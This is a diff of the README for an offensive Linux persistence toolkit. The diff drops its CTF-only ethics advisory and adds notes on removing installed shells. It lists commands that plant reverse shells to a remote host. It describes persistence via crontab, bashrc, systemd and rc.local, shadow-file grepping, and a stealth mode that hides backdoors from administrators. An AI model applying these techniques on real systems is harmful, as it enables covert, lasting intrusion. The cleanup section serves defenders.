@@ -1,12 +1,6 @@
 # linper
 
-Automated Linux Persistence Establishment
-
-Automatically install multiple methods of persistence, or just enumerate possible methods.
-
-## advisory
-
-This was developed with CTFs in mind and that is its intended use case. The stealth-mode option is for King of the Hill style competitions where others might try and tamper with your persistence. Please do not use this tool in an unethical or illegal manner.
+linux persistence toolkit - enumerate, install, or remove persistence mechanisms
 
 ## files
 
@@ -35,7 +29,7 @@ This was developed with CTFs in mind and that is its intended use case. The stea
 
 `bash linper.sh -i 10.10.10.10 -p 4444 -s`
 
-### remove any reverse shells installed by this program
+### remove reverse shells to a given RHOST
 
 `bash linper.sh --rhost 10.10.10.10 --clean`
 
@@ -43,10 +37,12 @@ This was developed with CTFs in mind and that is its intended use case. The stea
 
 #### caveats
 
-- It only removes reverse shells for the given RHOST (regardless of port)
+- This functionality is designed to remove reverse shells installed using this tool however since this tool uses common/well-known techniques, it may also be used to remove unwanted reverse shells if you know the C2 domain/IP
 - The cleaning mechanism does not remove any bash aliases from the `-s,--stealth-mode` options (though that is being planned, see TODO.md)
 
 ## methodology
+
+### installing
 
 1. Enumerating methods and doors - the script enumerates binaries that can be used for executing a reverse shell (methods, e.g. bash), and then for each of those, it enumerates ways to make them persist (doors, e.g. crontab). If dryrun is not set, every possible method and door pair is set
 
@@ -56,7 +52,7 @@ This was developed with CTFs in mind and that is its intended use case. The stea
 
 4. Shadow file enumeration - Enumerates whether or not the shadow file is readable, if dryrun is not set then it will grep for non-system accounts
 
-## stealth mode
+#### stealth mode
 
 `-s, --stealth-mode various trivial modifications in an attempt to hide the backdoors from humans`
 
@@ -66,6 +62,15 @@ This was developed with CTFs in mind and that is its intended use case. The stea
 
 3. Creates a `crontab` function in \~/.bash\_aliases to override the `-r` and `-l` flags. `-r` is changed to remove all crontab entries <u>except</u> your reverse shells. `-l` is changed to list all the existing cron jobs <u>except</u> your reverse shells.
 
-### caveat
+##### caveat
 
 1. If you run `-s, --stealth-mode` as a sudo enabled user, be aware that you can bypass the `crontab` function installed in \~/.bash\_aliases because aliases are not preserved when running `sudo`, nor does `sudo` call the `root` user aliases. (This does not interfere with the sudo hijack attack)
+### cleaning
+
+1. To remove shells from the bashrc (current user's and /etc/skel), it simply greps out any lines with the given RHOST and creates a temp file which is then used to replace the respective file
+
+2. To remove shells from crontab, it attempts to grep out any lines with the given RHOST from `crontab -l` and pipes that to crontab. If the install fails, it assumes there are no other cron jobs so it runs `crontab -r`
+
+3. To remove reverse shells from systemctl service tactics, it looks for the shell script with the given RHOST in it and then looks for the name of said file in a .service file and removes both. This particular method of cleaning may only be useful of cleaning reverse shells installed by this program becuase it is based on the specific way this program utilizes systemctl to install backdoors
+
+4. To remove shells from /etc/rc.local, it simply greps out any reference to the given RHOST and if the remaining file is two lines long it assumes there was nothing else to execute in rc.local so it removes the file (it checks for two lines because, at minimum, it must start with "!#/bin/sh -e" and end with "exit 0")
